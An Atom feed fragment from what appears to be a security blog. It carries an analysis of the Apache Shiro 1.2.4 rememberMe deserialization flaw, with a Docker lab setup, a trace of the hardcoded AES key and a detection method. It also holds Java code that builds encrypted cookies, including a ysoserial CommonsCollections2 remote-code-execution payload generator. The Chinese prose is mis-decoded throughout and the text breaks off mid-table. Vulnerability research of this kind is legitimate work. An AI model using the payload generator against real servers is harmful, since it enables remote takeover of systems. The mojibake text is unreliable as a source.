e5ee9ed9d90b10c83af0ced7fa3263739910b0b8b2389161de9913f81bb8708810b1b54e5f2bc52983a61abe7a69f16de579ca5d2c7b3271dfb06aff74ec4e589ffa9706f25988c3ba0a4a44fb889753a13942ae2c25d41453e2e291740fe1024a48cfef368acc56cb72ce84ae1d390</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      üîê ÂÜÖÈÉ®ÂàÜ‰∫´
    
    </summary>
    
    
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="0day" scheme="https://blog.sari3l.com/tags/0day/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-055 ÂàÜÊûê&amp;ÂõûÊòæ</title>
    <link href="https://blog.sari3l.com/posts/55ea3bd4/"/>
    <id>https://blog.sari3l.com/posts/55ea3bd4/</id>
    <published>2020-08-23T05:06:09.000Z</published>
    <updated>2020-08-23T05:10:03.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="I-ÂáÜÂ§á"><a href="#I-ÂáÜÂ§á" class="headerlink" title="I. ÂáÜÂ§á"></a>I. ÂáÜÂ§á</h2><p>‰ΩøÁî® docker hub Â∑≤ÊúâÁöÑÊºèÊ¥ûÁéØÂ¢ÉÔºåIDEA ÈÖçÁΩÆ Remote Debug</p><pre class=" language-shell"><code class="language-shell">> docker pull medicean/vulapps:s_shiro_1> docker run -d -p 8080:8080 -p 8090:8090 --env JAVA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=8090,server=y,suspend=n" medicean/vulapps:s_shiro_1</code></pre><p>ÊãâÂèñÊ∫êÁ†Å</p><pre class=" language-shell"><code class="language-shell">> git clone https://github.com/apache/shiro.git> git checkout shiro-root-1.2.4</code></pre><h2 id="II-ÊºèÊ¥ûÂéüÁêÜ"><a href="#II-ÊºèÊ¥ûÂéüÁêÜ" class="headerlink" title="II. ÊºèÊ¥ûÂéüÁêÜ"></a>II. ÊºèÊ¥ûÂéüÁêÜ</h2><p>ÂéüÂõ†ÊòØÂõ†‰∏∫Âú® org.apache.shiro.mgt.AbstractRememberMeManager ‰∏≠ÊúâÂÆö‰πâ‰ª•‰∏ãÂÜÖÂÆπÔºåÂØºËá¥ÊîªÂáªËÄÖÂà©Áî®ÈªòËÆ§ÂØÜÁ†ÅÂÆûÁé∞ÂèçÂ∫èÂàóÂåñRCE</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975905440609.jpg" alt="-w588"></p><ol><li><p>Â∫èÂàóÂåñÂØπË±°ÈúÄË¶ÅÁªßÊâø PrincipalCollection (ÂÆûÈôÖÈùûÂøÖÈ°ªÔºå‰∏ãÊñáÊúâËß£Èáä)</p></li><li><p>ËÆæÁΩÆÂä†ÂØÜÊñπÂºè‰∏∫ AES/CBC/PKCS5PaddingÔºåÂÖ∑‰ΩìÂèØÂú®org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService‰∏≠Êü•Áúã</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978155103697.jpg" alt="-w696"></p></li><li><p>Á°¨ÁºñÁ†ÅÈªòËÆ§Âä†ÂØÜÂØÜÈí• DEFAULT_CIPHER_KEY_BYTES</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975752216803.jpg" alt="-w888"></p></li></ol><h3 id="Âä†ÂØÜcookie"><a href="#Âä†ÂØÜcookie" class="headerlink" title="Âä†ÂØÜcookie"></a>Âä†ÂØÜcookie</h3><p>ÂΩìÁî®Êà∑ÁôªÈôÜÊàêÂäüÂπ∂‰∏îÈÄâÊã©remembermeÁöÑÊó∂ÂÄôÔºå‰ºöËøõÂÖ•org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin ‰øùÂ≠òÊñ∞ÁöÑÈ™åËØÅ‰ø°ÊÅØ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975913577431.jpg" alt="-w843"></p><p>Êé•ÁùÄÂú®rememberIdentityÂáΩÊï∞‰∏≠ÔºåÂÖàÈÄöËøágetIdentityToRememberËé∑ÂèñÂà∞Áî®Êà∑Ê†áÂøó‰ø°ÊÅØ</p><blockquote><p>Returns all principals associated with the corresponding Subject. Each principal is an identifying piece of information useful to the application such as a username, or user id, a given name, etc - anything useful to the application to identify the current Subject.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975918939762.jpg" alt="-w844"></p><p>ÂÜçËøõÂÖ•ÂêåÂêçÊñπÊ≥ïrememberIdentity‰∏≠ÔºåËøôÈáåÈ¶ñÂÖàÈÄöËøáconvertPrincipalsToBytesÂ∞ÜÁî®Êà∑‰ø°ÊÅØËΩ¨Êç¢Êàê byte Êï∞ÁªÑÔºåÂêéËøõË°å‰øùÂ≠ò</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975921483867.jpg" alt="-w744"></p><p>Êàë‰ª¨Êù•ÁúãconvertPrincipalsToBytesÔºåÂÖàËøõË°åÂ∫èÂàóÂåñÂêéÂÜçËøõË°åÂä†ÂØÜÔºåÊàë‰ª¨ÈáçÁÇπÂÖ≥Ê≥®Âä†ÂØÜÁÆóÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975917689368.jpg" alt="-w680"></p><p>Âú® org.apache.shiro.mgt.AbstractRememberMeManager#encrypt ‰∏≠Ë∞ÉÁî® AES Á±ªËøõË°åÂä†ÂØÜ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978076688353.jpg" alt="-w755"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978156691340.jpg" alt="-w423"></p><p>ÂÆûÈôÖÊòØË∞ÉÁî®<code>org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</code>Âíå<code>encrypt(byte[], byte[], byte[], boolean)</code>ÔºåÂèØ‰ª•ÁúãÂà∞Âú®ÊúÄÂêéÊòØÊää iv ÊîæÂú® crypt Âä†ÂØÜÂêéÁöÑÊï∞ÊçÆÂÜÖÂÆπÂâçÔºåÂÜçÊï¥‰ΩìËøîÂõû</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978160744231.jpg" alt="-w914"></p><p>ÊúÄÂêéËøõÂÖ•org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentityÔºåÂØπ‰ø°ÊÅØ base64ÁºñÁ†ÅÂêéÂ≠òÊîæÂÖ• cookie</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978164894987.jpg" alt="-w917"></p><h3 id="Ëß£ÂØÜcookie"><a href="#Ëß£ÂØÜcookie" class="headerlink" title="Ëß£ÂØÜcookie"></a>Ëß£ÂØÜcookie</h3><p>ÂΩìÁî®Êà∑Êê∫Â∏¶ rememberMe cookie ËøõË°åËÆøÈóÆÊó∂Ôºå‰ºöËøõÂÖ•org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978175616743.jpg" alt="-w698"></p><p>Ë∞ÉÁî®Â≠êÁ±ªCookieRememberMeManager#getRememberedSerializedIdentityÊèêÂèñ cookieÔºåÈ¶ñÂÖàÂà§Êñ≠Èùû deleteMe ‰∏îËøõË°å base64 Â∞æÈÉ®Ê£ÄÊµãÂ°´ÂÖÖÂêéÔºåËøîÂõûÊúâÊïà cookie ÂõûÂà∞ AbstractRememberMeManager</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978177704065.jpg" alt="-w902"></p><p>‰πãÂêéÂú®org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals‰∏≠ÔºåÂ∞ùËØïËß£ÂØÜÂíåÂèçÂ∫èÂàóÂåñ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978178067478.jpg" alt="-w817"></p><p>Ëß£ÂØÜ‰Ωç‰∫éorg.apache.shiro.mgt.AbstractRememberMeManager#decrypt</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978178548281.jpg" alt="-w772"></p><p>ÊúÄÂêéÁî±org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])Âíådecrypt(byte[], byte[], byte[])ÂÆûÁé∞Ëß£ÂØÜÔºåÊï¥‰∏™ÊµÅÁ®ãÈÉΩÂæàÂ∏∏ËßÑÔºå‰∏ªË¶ÅÂÖ≥Ê≥®ÊòØ‰ªé cookie Â§¥16‰ΩçÂ≠óËäÇÊï∞ÊçÆ‰∏∫ iv</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978180179924.jpg" alt="-w914"></p><h2 id="III-ÊºèÊ¥ûÊ£ÄÊµã"><a href="#III-ÊºèÊ¥ûÊ£ÄÊµã" class="headerlink" title="III. ÊºèÊ¥ûÊ£ÄÊµã"></a>III. ÊºèÊ¥ûÊ£ÄÊµã</h2><h3 id="1-Êó†ÊïàrememberMe"><a href="#1-Êó†ÊïàrememberMe" class="headerlink" title="1. Êó†ÊïàrememberMe"></a>1. Êó†ÊïàrememberMe</h3><p>Âè™ËÉΩÂø´ÈÄüÂà§Êñ≠ÊòØÂê¶‰ΩøÁî® shiro</p><h4 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>ÂΩìÊàë‰ª¨ËæìÂÖ•‰∏Ä‰∏™Êó†ÊïàÁöÑ rememberMe cookie Êó∂‰ºöÂõ†Êó†Ê≥ïËß£ÂØÜÊàñÂèçÂ∫èÂàóÂåñËß¶ÂèëÂºÇÂ∏∏ËøõÂÖ•org.apache.shiro.mgt.AbstractRememberMeManager#onRememberedPrincipalFailure</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978187385340.jpg" alt="-w1177"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188176420.jpg" alt="-w923"></p><p>‰πãÂêéËøõÂÖ•org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.SubjectContext)</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188494866.jpg" alt="-w687"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978188780907.jpg" alt="-w641"></p><p>ÊúÄÂêéË∞ÉÁî®org.apache.shiro.web.servlet.SimpleCookie#removeFromÊñπÊ≥ïÊ∑ªÂä† cookie <code>rememberMe=deleteMe</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978189943674.jpg" alt="-w910"></p><h4 id="ÊïàÊûú"><a href="#ÊïàÊûú" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978190869603.jpg" alt="-w830"></p><h3 id="2-ÂèçÂ∫èÂàóÂåñ"><a href="#2-ÂèçÂ∫èÂàóÂåñ" class="headerlink" title="2. ÂèçÂ∫èÂàóÂåñ"></a>2. ÂèçÂ∫èÂàóÂåñ</h3><p>‰∏ªË¶ÅÂà©Áî®Ê≠£Â∏∏Ëß£ÂØÜÂêéÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®Ôºå‰ΩÜÂèçÂ∫èÂàóÂåñÁöÑÂâçÊèêÊòØË¶Å‰ΩøÁî®Ê≠£Á°ÆÁöÑ key ÂÆûÁé∞Ê≠£Â∏∏Ëß£ÂØÜ</p><h4 id="ÂéüÁêÜ-1"><a href="#ÂéüÁêÜ-1" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>‰ªé‰∏äÈù¢<strong>Êó†Êïà rememberMe</strong>‰∏ÄËäÇ‰∏≠Êàë‰ª¨ËøòÂèØ‰ª•Áü•ÈÅì</p><ul><li>ÂΩì key ÂåπÈÖç‰∏îÊ≠£Â∏∏ÂèçÂ∫èÂàóÂåñÊó∂ÔºåÂìçÂ∫î‰∏ç‰ºöËøîÂõû rememberMe=delete</li><li>ÂΩì key ‰∏çÂåπÈÖçÊó∂ÔºåÂìçÂ∫îËøîÂõû rememberMe=delete</li></ul><p><strong>ÈÇ£‰πàÂè™Ë¶Å‰øùËØÅÂ∫èÂàóÂåñÂØπË±°ÁöÑÊúâÊïàÊÄßÔºåÂ∞±ÂèØ‰ª•ÈÄöËøá‰∏äÈù¢ÁöÑÂ∑ÆÂºÇÊù•ÂÆûÁé∞ÂåπÈÖç Key</strong></p><p>Âõ†‰∏∫Â∫èÂàóÂåñÂØπË±°ÈúÄË¶ÅÁªßÊâøPrincipalCollectionÔºåÊâÄ‰ª•Êàë‰ª¨‰∏ªË¶ÅÂÖ≥Ê≥®SimplePrincipalMap„ÄÅSimplePrincipalCollection</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978203984295.jpg" alt="-w850"></p><p>ÁÆÄÂçïÂÜô‰∏™ËÑöÊú¨Áî®‰∫éÁîüÊàê payload</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>PrincipalCollection<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span>SimplePrincipalMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">generate</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span>PrincipalCollection<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SimplePrincipalMap simplePrincipalMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimplePrincipalMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>simplePrincipalMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="ÊïàÊûú-1"><a href="#ÊïàÊûú-1" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h4><table><thead><tr><th>Key ÂåπÈÖç</th><th>Key ‰∏çÂåπÈÖç</th></tr></thead><tbody><tr><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978226467789.jpg" alt="-w828"></td><td><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978228045356.jpg" alt="-w829"></td></tr></tbody></table><h3 id="3-HTTPLog-or-DNSLog"><a href="#3-HTTPLog-or-DNSLog" class="headerlink" title="3. HTTPLog or DNSLog"></a>3. HTTPLog or DNSLog</h3><p>ÂÆûÈôÖ‰πüÊòØÂà©Áî®ÂèçÂ∫èÂàóÂåñÔºåÂè™ÊòØÁÆÄÂçïÁöÑÂêëÂ§ñËØ∑Ê±ÇËß£ÊûêÂüüÂêçÔºå‰ΩÜÊòØÂæàÂ§ö‰∫∫ÈÉΩÂñúÊ¨¢Áî®Ëøô‰∏™ÔºåÊâÄ‰ª•ÂçïÁã¨ÂàóÂá∫Êù•</p><p>XXXLog Âπ≥Âè∞Â¶ÇÊûúÊèê‰æõÊúâ API Â∞±ÂèØ‰ª•Ëá™Âä®ÂåñÊ£ÄÊµãÔºå‰ΩÜÊØïÁ´üÊ≠§ÊñπÊ≥ïÂèóÂ§™Â§öÂÆ¢ËßÇÂõ†Á¥†ÂΩ±ÂìçÔºå‰∏çÂª∫ËÆÆ</p><h2 id="IV-ÊºèÊ¥ûÂà©Áî®"><a href="#IV-ÊºèÊ¥ûÂà©Áî®" class="headerlink" title="IV. ÊºèÊ¥ûÂà©Áî®"></a>IV. ÊºèÊ¥ûÂà©Áî®</h2><p>Êàë‰ª¨ÂàöÊâçÊèêÂà∞‰∫ÜÔºåÂ∫èÂàóÂåñÂØπË±°ÈúÄË¶ÅÁªßÊâøPrincipalCollectionÔºåÈÇ£‰πàËøôÊòØÂøÖË¶ÅÁöÑ‰πàÔºüÂ¶ÇÊûúËÉΩÊ≤°ÊúâËøôÂ±ÇÈôêÂà∂ÔºåÊòØÂê¶ËÉΩÂà©Áî®ÂÖ∂‰ªñ gadget ËøõËÄåÂÆûÁé∞ RCE</p><p>Êàë‰ª¨ÂÖ≥Ê≥®Âà∞org.apache.shiro.mgt.AbstractRememberMeManager#deserializeÔºåËøôÈáåÊúÄÂêéË∞ÉÁî®ÁöÑÊòØorg.apache.shiro.io.DefaultSerializer#deserializeËøõË°åÂèçÂ∫èÂàóÂåñÔºåÂè™ÊòØÂú® return Êó∂‰ºöÂº∫Âà∂ËΩ¨Âåñ‰∏∫PrincipalCollectionÁ±ªÂûãÂØπË±°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978236110127.jpg" alt="-w601"></p><p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂÖ∂‰ªñ gadget ÊâßË°åÊîªÂáªÔºå‰æãÂ¶Ç ysoserial Á≥ªÂàó</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>CommonsCollections2<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>Object<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommonsCollections2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token string">"&lt;Exec Command>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="gadget-ÂºÇÂ∏∏"><a href="#gadget-ÂºÇÂ∏∏" class="headerlink" title="gadget ÂºÇÂ∏∏"></a>gadget ÂºÇÂ∏∏</h3><p>ËøôÈáåÂèØËÉΩ‰ºöÊúâ‰∫∫ÊèêÂà∞Ôºå‰∏∫‰ªÄ‰πàÂæàÂ§ö cc gadget Êó†Ê≥ï‰ΩøÁî®Âë¢ÔºüÁÆÄÂçïË∑ü‰∏Ä‰∏™ cc4Ôºå‰ºöÂèëÁé∞Êä•ÈîôÊèêÁ§∫Êâæ‰∏çÂà∞<code>org.apache.commons.collections4.Transformer</code>ÔºåËÄå shiro 1.2.4 ÈªòËÆ§‰ΩøÁî®ÁöÑ commons-collections4-4.0.jar ÁêÜËÆ∫‰∏äÊòØÂèØ‰ª•ÁöÑÂà©Áî®ÁöÑÔºåÊä•ÈîôÂéüÂõ†Âú®Âì™ÈáåÔºü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979087078911.jpg" alt="-w1501"></p><p>Êàë‰ª¨ÂõûÂà∞ÂèçÂ∫èÂàóÂåñÊúÄÂºÄÂßãÁöÑÂú∞Êñπorg.apache.shiro.io.DefaultSerializer#deserializeÔºåÊ≥®ÊÑèËøôÈáåË∞ÉÁî®ÁöÑÊòØClassResolvingObjectInputStream.readObject()</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979098205251.jpg" alt="-w699"></p><p>ClassResolvingObjectInputStreamÁªßÊâøËá™ObjectInputStream‰ΩÜÈáçÂÜô‰∫Ü resolveClassÔºåÊúÄÂ§ßÁöÑ‰∏çÂêåÂú®‰∫éÂä†ËΩΩÊñπÂºè</p><table><thead><tr><th>-</th><th align="center">ClassResolvingObjectInputStream</th><th align="center">ObjectInputStream</th></tr></thead><tbody><tr><td>‰ª£Á†Å</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979099399026.jpg" alt="-w724"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979099587009.jpg" alt="-w691"></td></tr><tr><td>Âä†ËΩΩ</td><td align="center">ClassUtils.forName<br>ÂÆûÈôÖ ClassLoader.loadClass</td><td align="center">Class.forName</td></tr><tr><td>‰ª£Á†Å</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979102998850.jpg" alt="-w918"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979106277660.jpg" alt="-w829"></td></tr></tbody></table><p>ÈÇ£‰πà‰∏§ÁßçÂä†ËΩΩÊñπÂºèÁöÑÂå∫Âà´ÊòØ‰ªÄ‰πàÔºüËøôÈáåÂèØÂÖàËØ¶ÁªÜÈòÖËØªËøôÁØáÊñáÁ´†Ôºö<a href="https://www.jianshu.com/p/83cbbd0b8b10" target="_blank" rel="noopener">ClassUtilsËØ¶Ëß£</a></p><table><thead><tr><th align="center">-</th><th align="center">ClassLoader.loadClass</th><th align="center">Class.forName</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">Ëé∑ÂèñÊåáÂÆöÁöÑ classLoader</td><td align="center">Ëá™Âä®Ëé∑Âèñ classLoader</td></tr><tr><td align="center">2</td><td align="center">Âè™ËÉΩÂ∞ÜÁ±ªÂä†ËΩΩÂà∞ JVM</td><td align="center">ÂèØÂä†ËΩΩÂà∞ JVM 